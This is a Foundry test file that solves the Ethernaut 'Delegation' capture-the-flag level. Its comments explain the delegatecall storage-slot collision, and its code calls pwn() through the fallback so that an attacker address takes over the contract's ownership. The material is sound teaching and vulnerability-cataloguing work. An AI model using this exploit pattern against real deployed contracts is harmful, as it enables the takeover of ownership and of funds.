// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Delegation, Delegate} from "../src/levels/Delegation.sol";

/// Ethernaut #6 "Delegation" → Aegis catalog `proxy-storage-collision`.
/// Delegation's fallback `delegatecall`s arbitrary calldata into Delegate, which runs against
/// Delegation's storage. `Delegate.owner` and `Delegation.owner` share slot 0, so calling `pwn()`
/// through the fallback overwrites Delegation's owner with the caller.
/// Win condition (DelegationFactory.validateInstance): owner == player.
contract DelegationTest is Test {
    address attacker = makeAddr("attacker");

    function test_solve_delegation() public {
        Delegate del = new Delegate(address(this));
        Delegation level = new Delegation(address(del)); // owner = address(this) (deployer)
        assertEq(level.owner(), address(this), "deployer starts as owner");

        // Hit the fallback with pwn()'s selector -> delegatecall -> writes slot 0 (owner) = attacker.
        vm.prank(attacker);
        (bool ok,) = address(level).call(abi.encodeWithSignature("pwn()"));
        assertTrue(ok, "delegatecall to pwn() succeeded");

        assertEq(level.owner(), attacker, "Delegation solved: attacker seized ownership");
    }
}
